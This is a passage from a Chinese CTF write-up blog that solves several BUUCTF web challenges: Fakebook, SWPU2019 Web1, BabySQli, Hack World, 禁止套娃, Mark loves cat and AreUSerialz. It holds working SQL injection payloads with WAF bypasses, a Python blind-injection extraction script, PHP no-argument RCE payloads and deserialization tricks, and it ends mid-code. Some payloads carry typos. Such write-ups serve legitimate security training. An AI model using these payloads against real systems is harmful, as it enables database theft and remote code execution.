2018]Fakebook</h2><p>robots.txt</p><ul><li>ssrf</li><li>sql注入</li><li>反序列化漏洞</li></ul><p>看到</p><p>/user.php.bak</p><p>下载后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>join，即注册一个用户</p><p>点击自己的username，点击之后，观察url可能存在get注入。是数字型注入。union select 发现有waf，用/<strong>/即可绕过。union /</strong>/ select.回显位置是第二位，往下注注注。</p><p>发现爆出路径：/var/www/html/</p><p>o:8:”UserInfo”:3:{s:4:”name”:1:”a”;s:3:”age”:i:1:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}</p><p>因为blog在第四位，所以paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>注入后blog栏显示file:///var/www/html/flag.php，此时即代表注册成功。查看源码：</p><p>iframe标签中读取了flag.php中的内容。flag即出现</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p><strong>知识点</strong></p><p>二次注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select * from ad where title = &#x27;</span>$title<span class="string">&#x27; limit 0,1</span></span><br></pre></td></tr></table></figure><p>过滤了空格用/**/绕</p><p>过滤了报错注入函数，用联合注入</p><p>过滤了or不能用order by 判断字段数和查询information_schema 这个库判断用group by</p><p>过滤了注释符又要闭合单引号 用group by 1’,1’</p><h3 id="用group-by-查询列数"><a href="#用group-by-查询列数" class="headerlink" title="用group by 查询列数"></a>用group by 查询列数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 判断多少字段</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;group/**/by/**/22,&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;group/**/by/**/23,&#x27;</span><span class="number">1</span></span><br><span class="line"># 可得字段为<span class="number">22</span>个</span><br></pre></td></tr></table></figure><h3 id="绕过information-schema"><a href="#绕过information-schema" class="headerlink" title="绕过information_schema"></a>绕过information_schema</h3><ul><li>利用sys.schema_auto_increment_columns</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure><ul><li>这里数据库为MaeiaDB，可用mysql.innodb_table_stats查表名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"># 结果</span><br><span class="line">FLAG_TABLE,news,users,gtid_slave_pos,ads,users</span><br></pre></td></tr></table></figure><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>知识点</p><ul><li><p>绕过密码的md5验证</p><p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p><p>base32  base64 解密</p><p>select * from user where username = ‘$name’</p></li></ul><p>直接可以用联合注入，表里有三列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; Order by 3#</span></span><br></pre></td></tr></table></figure><p>进行用联合注入，回显wrong user!，说明用户不在第一列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,3#</span></span><br></pre></td></tr></table></figure><p>尝试将用户名放在第二列，回显wrong pass!，找到用户名在第二列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,3#</span></span><br></pre></td></tr></table></figure><p>0’ union select 0,’admin’,’e10adc3949ba59abbe56e057f20f883e’#</p><p>密码输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure><p>flag{bbdf4c9d-3ae8-42a4-9f0f-b1ebd92537ae}</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p><strong>知识点</strong></p><ul><li>异或注入</li></ul><p>一开始就给出了我们所需的表名和列名，然后提交一个id</p><p>当提交1和2的时候，查询出了两句，其他则报错</p><p>尝试输入一些常规的sql注入查询语句，结果都被过滤了</p><p>显示 <em>SQL Injection Checked.</em></p><p>尝试<strong>异或注入</strong>，输入1^1^1，返回了id=1的结果</p><p><strong>输入1^(ascii(substr((select(flag)from(flag)),1,1))&gt;x)^1，这里x是一个未知数，不断改变x的值，便可根据回显逐渐爆破出flag</strong></p><p>大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://d7b94d40-8ccb-4ead-9ace-89662e7f29c7.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">43</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">127</span>):</span><br><span class="line">        s = (<span class="built_in">int</span>)((<span class="built_in">max</span>+<span class="built_in">min</span>)/<span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">&#x27;1^(ascii(substr((select(flag)from(flag)),&#x27;</span> + \</span><br><span class="line">            <span class="built_in">str</span>(i)+<span class="string">&#x27;,1))&gt;&#x27;</span>+<span class="built_in">str</span>(s)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        r = requests.post(url, data=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(r.content):</span><br><span class="line">            <span class="built_in">max</span> = s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = s</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">max</span>-<span class="built_in">min</span>) &lt;= <span class="number">1</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">max</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><strong>知识点</strong></p><p>无参数RCE</p><p>什么都看不到，先扫一下目录</p><p>发现.git 目录 是git泄露</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读下代码</p><p>第一个if php伪协议用不了 第二个if (?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数 第三个if et info等函数也用不了 典型的无参数rce 简单来说 我们需要用全局变量来rce</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>以一般的思路来说 肯定是要先scandir的 没有scandir没办法往下做 但是问题是scandir需要一个目录 而如果扫描当前目录的话需要一个”.” 第一部的预想就是要构造一个”.”<br><a href="https://www.w3school.com.cn/php/func_string_localeconv.asp">localeconv()</a><br>既然是数组 可以用current()  <code>函数默认截取第一个</code></p><p>即得 ?exp=print_r(scandir(current(localeconv())))</p><p>现在我们只是拿到了这个数组的键值 还没有拿到这个数组对应flag键值的具体值</p><p><a href="https://www.runoob.com/php/func-array-flip.html">array_flip()</a><br>这个函数就可以得到键值 flag.php</p><p>只能通过highlight_file或者show_source flag.php的方法 简单来说就是要一个单独的flag.php这个倒数第二个值</p><p><a href="https://www.w3school.com.cn/php/func_array_rand.asp">array_rand()</a><br>简单来说这个函数可以随机返回一个数组里的值 </p><p>payload</p><p><code>?exp=show_scoure(array_rand(array_flip(scandir(current(localconv())))))</code>;</p><p>或者</p><p><code>?exp=print_r(highlight_file(array_rand(array_flip(scandir(current(localconv()))))));</code></p><p>array_reverse() 简单来说就是逆序输出数组 但是我们的那个flag在倒数第二个 所以我们还需要一个next() 顾名思义 输出下一个</p><p>payload</p><p><code>?exp=print_r(highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p><p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。</p><p>因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php</p><p>payload</p><p><code>?exp=show_source(session_id(session_start()));</code></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><strong>知识点</strong></p><ul><li>.git泄露</li><li>变量覆盖漏洞</li></ul><p>进网站什么都找不到，扫一下目录</p><p>发现是.git源码泄露</p><p>用githack下载查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag.php</span></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>可以发现代码中有变量覆盖漏洞</p><p>通过观察发现没有办法绕过到达最后的echo 出flag</p><p>但exit也可以打印没有打印$flag 我们可以变量覆盖</p><h3 id="观察第一个exit"><a href="#观察第一个exit" class="headerlink" title="观察第一个exit"></a>观察第一个exit</h3><p>GET参数中flag的值强等于某个变量($x)而且这个变量强不等于flag</p><p>即要存在又不能存在，不可能</p><h3 id="观察第二个exit"><a href="#观察第二个exit" class="headerlink" title="观察第二个exit"></a>观察第二个exit</h3><p>不存在post或get型的flag参数</p><p>我们想要通过单纯的post参数搞定它是不可能的，因为post处的变量覆盖是让它变成我们可控的值，所以不能</p><p>我们可以通过单纯的get或者get+post搞定</p><p>get传参 yds=flag；</p><h3 id="观察第三个exit"><a href="#观察第三个exit" class="headerlink" title="观察第三个exit"></a>观察第三个exit</h3><p>post型的flag强等于flag 或者get型的flag强等于flag</p><p>那我们就先从post型flag=flag开始：</p><p>我们post的数据，会在这一步，把原来的$flag的值改变，因为$x=flag,$y=flag，然后带进去变成了$flag=flag，原来的flag值没了，这条路不通：</p><p>我们试试get型的flag=flag：<br>is=flag&amp;flag=flag）</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="comment">// $this-&gt;process();</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span 